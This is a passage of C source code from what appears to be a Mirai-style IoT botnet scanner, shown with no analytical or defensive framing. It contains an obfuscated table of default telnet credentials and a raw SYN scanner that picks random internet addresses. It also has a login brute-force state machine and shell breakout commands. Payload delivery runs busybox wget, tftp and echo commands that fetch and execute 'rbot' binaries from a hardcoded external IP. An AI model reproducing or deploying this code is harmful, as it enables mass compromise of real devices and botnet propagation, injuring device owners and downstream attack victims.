    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x51\x57\x4C\x13\x13\x1A\x1A", 1);                                    // root:zsun1188
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 2);                                              // root:888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 1);                                            // root:666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);                                      // root:password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x12\x12\x13\x41\x4A\x4B\x4C", 2);                                      // root:1001chin
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x57\x4C\x56\x17\x15\x17\x1B", 2);                                      // root:hunt5759
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 7);                      // root:7ujMko0admin
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x58\x5B\x43\x46\x13\x10\x11\x16", 2);          // supervisor:zyad1234

    add_auth_entry("\x4F\x45\x11\x17\x12\x12", "\x4F\x47\x50\x4E\x4B\x4C", 15);                                     // mg3500:merlin
    add_auth_entry("\x46\x47\x44\x43\x57\x4E\x56", "", 5);                                                          // default:
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 10);                             // support:support
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x13\x10\x11\x16", 7);                                          // support:1234
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x13\x10\x11\x16\x17\x14", 7);                                  // support:123456
    add_auth_entry("\x57\x51\x47\x50", "\x13\x10\x11\x16\x17\x14", 3);                                              // user:123456
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x13\x13\x13", 10);                                                 // guest:1111
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 3);                                              // guest:guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17\x14", 1);                                          // guest:123456
    add_auth_entry("\x46\x43\x47\x4F\x4D\x4C", "", 7);                                                              // daemon:
    add_auth_entry("\x13\x10\x11\x16", "\x13\x10\x11\x16", 2);                                                      // 1234:1234
    add_auth_entry("\x40\x4B\x4C", "", 10);                                                                         // bin:
    add_auth_entry("\x56\x47\x4E\x4C\x47\x56", "\x56\x47\x4E\x4C\x47\x56", 15);                                      // telnet:telnet
    add_auth_entry("\x4D\x52\x47\x50\x43\x56\x4D\x50", "\x4D\x52\x47\x50\x43\x56\x4D\x50", 1);                      // operator:operator



#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                //iph->daddr = INET_ADDR(119,76,134,129);
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                tcph->dest = htons(23);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            //printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
                if (conn->fd == -1)
                    continue;
#ifdef DEBUG
                //printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        fdclose(conn, 1);
                    }
                    else
                        setup_connection(conn);
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
					//printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }

                conn->state = SC_HANDLE_IACS;

				if(!conn->info.has_arch)
					conn->auth = random_auth_entry();

                conn->rdbuf_pos = 0;

#ifdef DEBUG
                //printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos > 7168)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        //printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;
                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                fdclose(conn, 1);
                            }
                            else
                                setup_connection(conn);
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                                conn->state = SC_WAITING_USERNAME;
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_login_prompt(conn, 1)) > 0)
                            {
#ifdef DEBUG
                                //printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
								fdsend(conn->fd, conn->auth->username);
                                conn->state = SC_WAITING_PASSWORD;
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_login_prompt(conn, 0)) > 0)
                            {
#ifdef DEBUG
                                //printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif
                                fdsend(conn->fd, conn->auth->password);
                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_shell_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                //printf("[scanner] FD%d sending shell prompts\n", conn->fd);
#endif

								table_unlock_val(TABLE_SCAN_QUERY);
                                fdsend(conn->fd, "enable\r\nsystem\r\nshell\r\nsh\r\nping ; sh"); // our response to move on, if no echo no worko.
                                fdsend(conn->fd, "%s", table_retrieve_val(TABLE_SCAN_QUERY, NULL)); // our response to move on, if no echo no worko.
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_CONSUME_ARCH;
                            }
							else if (consumed == -1)
                            {
#ifdef DEBUG
                                //printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                // Retry
                                if (++(conn->tries) == 10)
                                {
                                    fdclose(conn, 1);
                                }
                                else
                                    setup_connection(conn);
                            }
                            break;
                        case SC_CONSUME_ARCH:
							if ((consumed = consume_resp_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d attempting to grab arch\n", conn->fd);
#endif
								conn->echo = 0;

								if(!conn->info.has_arch)
								{
									fdsend(conn->fd, "/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1");
									conn->state = SC_CONSUME_ELF_HEADER;
								}
								else
								{
									if(!strcmp(conn->arch, "arm") || !strcmp(conn->arch, "arm4"))
									{
										table_unlock_val(TABLE_SCAN_QUERY);
                                        fdsend(conn->fd, "/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s", table_retrieve_val(TABLE_SCAN_QUERY, NULL));
										table_lock_val(TABLE_SCAN_QUERY);

										conn->state = SC_CONSUME_SUBARM;
										break;
									}

									table_unlock_val(TABLE_SCAN_QUERY);
									fdsend(conn->fd, table_retrieve_val(TABLE_SCAN_QUERY, NULL));
									table_lock_val(TABLE_SCAN_QUERY);
									conn->state = SC_CONSUME_WRDIR;
								}
                            }
							break;

						case SC_CONSUME_ELF_HEADER:
							if((consumed = parse_elf_response(conn)) > 0)
                            {
								conn->info.has_arch = 1;
								setup_connection(conn);
                            }
                            else if (consumed == -1)
                            {
                                conn->tries = 0;
                                fdclose(conn, 1);
                            }
							break;
						case SC_CONSUME_SUBARM:
							if((consumed = consume_arm_subtype(conn)) > 0)
                            {
								table_unlock_val(TABLE_SCAN_QUERY);
								fdsend(conn->fd, table_retrieve_val(TABLE_SCAN_QUERY, NULL));
								table_lock_val(TABLE_SCAN_QUERY);

								conn->state = SC_CONSUME_WRDIR;
                            }
							break;
						case SC_CONSUME_WRDIR:
							if((consumed = consume_resp_prompt(conn)) > 0)
                            {
								report_working(conn->dst_addr, conn->dst_port, conn, 0);
								#ifdef DEBUG
									printf("[scanner] FD%d bruteforced! arch:%s\n", conn->fd, conn->arch);
								#endif

								int dir;
								for(dir = 0; dir < 15; dir++)
									fdsend(conn->fd, ">%s.file && cd %s", tmp_dirs[dir], tmp_dirs[dir]);

                                fdsend(conn->fd, "/bin/busybox rm -rf .file %s %s", FN_BINARY, FN_DROPPER);

								table_unlock_val(TABLE_SCAN_QUERY);
								fdsend(conn->fd, "/bin/busybox cp /bin/busybox " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY"; %s", table_retrieve_val(TABLE_SCAN_QUERY, NULL));
								table_lock_val(TABLE_SCAN_QUERY);

								conn->state = SC_CONSUME_SEND_METHOD;
                            }
							break;
						case SC_CONSUME_SEND_METHOD:
							if((consumed = consume_resp_prompt(conn)) > 0)
                            {
								if(strcmp(conn->arch, "unknown") == 0)
								{
									#ifdef DEBUG
										printf("[scanner] FD%d arch is unknown, sending payload\n", conn->fd);
									#endif

									table_unlock_val(TABLE_SCAN_QUERY);
									fdsend(conn->fd, "/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >" FN_SHELL "; /bin/busybox tftp -g -l " FN_SHELL " -r rbot.sh %d.%d.%d.%d; sh "FN_SHELL"; %s", 176, 107, 133, 208, 176, 107, 133, 208, table_retrieve_val(TABLE_SCAN_QUERY, NULL));
                                    table_lock_val(TABLE_SCAN_QUERY);

                                    conn->info.upload_method = UPLOAD_SHELL;
									conn->state = SC_FINISH_RESONSE_EXIT;
									break;
								}

								#ifdef DEBUG
									printf("[scanner] FD%d Found token after DIR\n", conn->fd);
								#endif

								table_unlock_val(TABLE_SCAN_QUERY);
								fdsend(conn->fd, "/bin/busybox wget; /bin/busybox tftp; %s", table_retrieve_val(TABLE_SCAN_QUERY, NULL));
								table_lock_val(TABLE_SCAN_QUERY);

								conn->state = SC_METHOD_CONSUME;
                            }
							break;
						case SC_METHOD_CONSUME:
							consumed = connection_consume_upload_methods(conn);
							if(consumed)
							{
								table_unlock_val(TABLE_SCAN_QUERY);

								switch(conn->info.upload_method)
								{
    								case UPLOAD_ECHO:
                                    {
    										fdsend(conn->fd, "/bin/busybox cp /bin/busybox " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER"; %s", table_retrieve_val(TABLE_SCAN_QUERY, NULL));
    										#ifdef DEBUG
    										printf("[scanner] FD%d falling back to echo\n", conn->fd);
    										#endif
                                    }
                                    break;
    								case UPLOAD_WGET:
                                    {
    										fdsend(conn->fd, "/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >" FN_BINARY "; /bin/busybox chmod 777 "FN_BINARY";./"FN_BINARY"s wget; %s", 176, 107, 133, 208, conn->arch, table_retrieve_val(TABLE_SCAN_QUERY, NULL));
                                            //fdsend(conn->fd, "%s", table_retrieve_val(TABLE_SCAN_QUERY, NULL));
                                            #ifdef DEBUG
        											printf("[scanner] FD%d selected 'WGET'\n", conn->fd);
        									#endif
                                    }
                                    break;
    								case UPLOAD_TFTP:
                                    {
    										#ifdef DEBUG
    											printf("[scanner] FD%d selected 'TFTP'\n", conn->fd);
    										#endif
    										fdsend(conn->fd, "/bin/busybox tftp -g -l " FN_BINARY " -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 " FN_BINARY";./"FN_BINARY" tftp; %s", conn->arch, 176, 107, 133, 208, table_retrieve_val(TABLE_SCAN_QUERY, NULL));
                                    }
                                    break;
								}

								table_lock_val(TABLE_SCAN_QUERY);

								if(conn->info.upload_method != UPLOAD_ECHO)
									conn->state = SC_FINISH_RESONSE_EXIT;
								else
									conn->state = SC_METHOD_ECHO;
							}
							break;
						case SC_METHOD_ECHO:
							if((consumed = consume_resp_prompt(conn)) > 0)
                            {
                                p = get_retrieve_binary(conn);
                                if(!p)
                                {
                                    #ifdef DEBUG
    									printf("[scanner] FD%d failed p [%s]\n", conn->fd, conn->arch);
    								#endif
                                    fdclose(conn, 1);
                                    break;
                                }
                                bin = process_retrieve_binary(p);
                                if(!bin)
                                {
                                    #ifdef DEBUG
    									printf("[scanner] FD%d failed bin [%s]\n", conn->fd, conn->arch);
    								#endif
                                    fdclose(conn, 1);
                                    break;
                                }

                                table_unlock_val(TABLE_SCAN_QUERY);
                                fdsend(conn->fd, "/bin/busybox echo -en '%s' %s " FN_DROPPER ";%s;%s", bin[conn->dropper_index].str, conn->dropper_index == 0 ? ">" : ">>", conn->dropper_index >= bin->index-1 ? "./.rbot.dropper;./.rbot.binary echo" : "chmod 777 .rbot.dropper", table_retrieve_val(TABLE_SCAN_QUERY, NULL));
                                table_lock_val(TABLE_SCAN_QUERY);

                                if (conn->dropper_index < bin->index)
                                {
                                    #ifdef DEBUG
    									printf("[scanner] FD%d dropped [%d of %d] [%s]\n", conn->fd, conn->dropper_index, bin->index, conn->arch);
    								#endif

                                    free(bin);
                                    conn->dropper_index++;
                                    conn->state = SC_METHOD_ECHO;
                                    break;
                                }

                                free(bin);
								conn->state = SC_FINISH_RESONSE_EXIT;
                            }
							break;
						case SC_FINISH_RESONSE_EXIT:
							if((consumed = consume_method_resonse(conn)) > 0)
							{
                                #ifdef DEBUG
                                    printf("[scanner] FD%d Read-only file system [%s]\n", conn->fd, conn->arch);
                                #endif

                                report_working(conn->dst_addr, conn->dst_port, conn, 1);
                                fdclose(conn, 1);
							}
                            else if (consumed == -1)
                            {
                                    #ifdef DEBUG
                            		printf("[scanner] FD%d No socket permitions, attempting echo echoing!\n", conn->fd);
                            		#endif

                                    if (conn->state == SC_METHOD_ECHO || conn->info.upload_method == UPLOAD_ECHO)
                                    {
                                        fdclose(conn, 1);
                                        break;
                                    }

                                    conn->info.upload_method = UPLOAD_ECHO;
                                    conn->state = SC_METHOD_ECHO;

                                    table_unlock_val(TABLE_SCAN_QUERY);
    								fdsend(conn->fd, table_retrieve_val(TABLE_SCAN_QUERY, NULL));
    								table_lock_val(TABLE_SCAN_QUERY);

                                    break;
                            }
                            else if (consumed == -2)
                            {
                                #ifdef DEBUG
                                    printf("[scanner] FD%d Read-only file system [%s]\n", conn->fd, conn->arch);
                                #endif
                                fdclose(conn, 1);
                                break;
                            }
                            /*else if (consumed == -2)
                            {
                                if (conn->oppsitearm == 1)
                                {
                                    fdclose(conn, 1);
                                    break;
                                }

                                conn->oppsitearm = 1;

                                #ifdef DEBUG
                                    printf("[scanner] FD%d %s is the wrong arm arch.., attempting to echo\n", conn->fd, conn->arch);
                                #endif

                                if(conn->machine == EM_ARM7) conn->machine = EM_ARM;
                                else if (conn->machine == EM_ARM) conn->machine = EM_ARM7;

                                conn->info.has_arch = 1;
								setup_connection(conn);
                            }*/

                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                        {
                            #ifdef DEBUG
                                //printf("[scanner] FD%d Nothing Consumed [%s]\n", conn->fd, conn->arch);
                            #endif
                            break;
                        }
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                            conn->rdbuf[conn->rdbuf_pos] = 0;
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
	{
        close(conn->fd);
		conn->fd = -1;
	}

    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }
	if(conn->info.upload_method > -1)
		conn->info.upload_method = -1;

    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint8_t ip_state[4];

    do
    {
        ip_state[0] = rand_next() % 0xff;
        ip_state[1] = rand_next() % 0xff;
        ip_state[2] = rand_next() % 0xff;
        ip_state[3] = rand_next() % 0xff;
    }
    while(ip_state[0] == 0 || (ip_state[0] == 127));
    int rand = rand_next() % 35;
    if (rand == 0)
        return INET_ADDR(119,ip_state[1],ip_state[2],ip_state[3]);
    else if (rand == 1)
        return INET_ADDR(119,157,ip_state[2],ip_state[3]);
    else if (rand == 2)
        return INET_ADDR(119,158,ip_state[2],ip_state[3]);
    else if (rand == 3)
        return INET_ADDR(116,ip_state[1],ip_state[2],ip_state[3]);
    else if (rand == 4)
        return INET_ADDR(186,ip_state[1],ip_state[2],ip_state[3]);
    else if (rand == 5)
        return INET_ADDR(177,ip_state[1],ip_state[2],ip_state[3]);
    else if (rand == 6 || rand == 7 )//60.243
        return INET_ADDR(60,243,ip_state[2],ip_state[3]);
    else if (rand == 10 || rand == 11 )
        return INET_ADDR(115,98,ip_state[2],ip_state[3]);
    else if (rand == 12 || rand == 13)//60.243
        return INET_ADDR(203,212,ip_state[2],ip_state[3]);
    else if (rand == 8 || rand == 9)
        return INET_ADDR(27,7,ip_state[2],ip_state[3]);
    else
        return INET_ADDR(ip_state[0],ip_state[1],ip_state[2],ip_state[3]);


}

static int parse_elf_response(struct scanner_connection *conn)
{
    int i = 0, pos = 0;
    char *elf_magic = "\x7f\x45\x4c\x46", *tmp;
	int a;

    for(i = 0; i < SCANNER_RDBUF_SIZE; i++)
    {
        if(conn->rdbuf[i] == elf_magic[pos])
        {
			if(++pos == 4)
            {
                pos = i;
                break;
            }
        }
        else
        {
            pos = 0;
        }
    }

	if(!pos)
		return 0;


	#ifdef DEBUG
		printf("[scanner] FD%d found elf magic at position %d\n", conn->fd, pos);
	#endif

    conn->endianness = conn->rdbuf[pos + 0x2];
    conn->machine = conn->rdbuf[pos + 0xf];

	if(conn->machine == 65)
		conn->machine = 8;


	/*for(a = 0; a < 0x32; a++)
	{
		int tmp = conn->rdbuf[pos + a];
		printf("Read at position/data: 0x%x/%d\n", a, tmp);
	}*/

#ifdef DEBUG
	printf("[scanner] FD%d elf->machine %d elf->endianness %d\n", conn->fd, conn->machine, conn->endianness);
#endif

	if(conn->machine == EM_NONE || conn->endianness == EM_NONE)
		return -1;

    if(conn->machine == EM_ARM)
		tmp = "arm";
    else if(conn->machine == EM_AARCH64)
    	tmp = "arm64";
    else if(conn->machine == EM_X86_64)
		tmp = "x86";
    else if(conn->machine == EM_MIPS && conn->endianness == ENDIAN_BIG || conn->machine == EM_MPSL && conn->endianness == ENDIAN_BIG)
    {
        conn->machine = EM_MIPS;
        tmp = "mips";
    }
    else if(conn->machine == EM_MIPS && conn->endianness == ENDIAN_LITTLE || conn->machine == EM_MPSL && conn->endianness == ENDIAN_LITTLE)
    {
        conn->machine = EM_MIPS;
        tmp = "mipsel";
    }
    else
		tmp = "unknown";

	strcpy(conn->arch, tmp);

    return pos;
}

static int consume_arm_subtype(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
	table_lock_val(TABLE_SCAN_RESP);

    if(prompt_ending == -1)
    {
        //printf("[%d:%d] buffer not found  ==> %s\n", prompt_ending, conn->rdbuf_pos, conn->rdbuf);
        return 0;
    }

    //printf("[%d:%d] buffer ==> %s\n", prompt_ending, conn->rdbuf_pos, conn->rdbuf);

	if(util_memsearch(conn->rdbuf, prompt_ending - 1, "ARMv7", 5) != -1 || util_memsearch(conn->rdbuf, prompt_ending - 1, "ARMv6", 5) != -1 )
    {
        strcpy(conn->arch, "arm7");
        conn->machine = EM_ARM7;

		#ifdef DEBUG
            printf("[scanner] FD%d new arch: %s!\n", conn->fd, conn->arch);
        #endif
	}
    else
        strcpy(conn->arch, "arm4");

    return prompt_ending;
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_shell_prompt(struct scanner_connection *conn)
{
    int i, prompt_ending = -1;

    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ncorrect", 8) != -1)
        return -1;
	else if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "nvalid", 6) != -1)
        return -1;
	else if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ncomplete", 9) != -1)
        return -1;
	else if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "attempt failed", 14) != -1)
        return -1;
	else if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "% Bad", 5) != -1)
        return -1;

	for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%' || conn->rdbuf[i] == ']' || conn->rdbuf[i] == '~')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == 0)
        prompt_ending = 1;

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_login_prompt(struct scanner_connection *conn, int user)
{
    int i, tmp, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || (conn->rdbuf[i] == '%' && user == 1))
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
		if(user == 1)
		{
			if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1) prompt_ending = tmp;
			else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)  prompt_ending = tmp;
			else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ser", 3)) != -1) prompt_ending = tmp;
		}
		else
			if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1) prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_upload_methods(struct scanner_connection *conn)
{
	char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
	table_lock_val(TABLE_SCAN_RESP);

    if(prompt_ending == -1)
        return 0;

    if(util_memsearch(conn->rdbuf, prompt_ending - 1, "sage: wget", 10) != -1)
		conn->info.upload_method = UPLOAD_WGET;
	else if(util_memsearch(conn->rdbuf, prompt_ending - 1, "sage: tftp", 10) != -1)
		conn->info.upload_method = UPLOAD_TFTP;
	else
		conn->info.upload_method = UPLOAD_ECHO;

    return prompt_ending;
}

//Permission denied

static int consume_method_resonse(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    if(util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ead-only file system", 20) != -1)
       return -2;
    else if(util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ermission denied", 16) != -1)//
        return -1;

    /*else if(util_memsearch(conn->rdbuf, conn->rdbuf_pos, "egmentation fault", 17) != -1 && (conn->machine == EM_ARM7 || conn->machine == EM_ARM))
    {


        conn->state = SC_METHOD_ECHO;
        conn->echo = 0;

        return -2;
    }*/

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if(prompt_ending == -1)
        return 0;
    else
    {
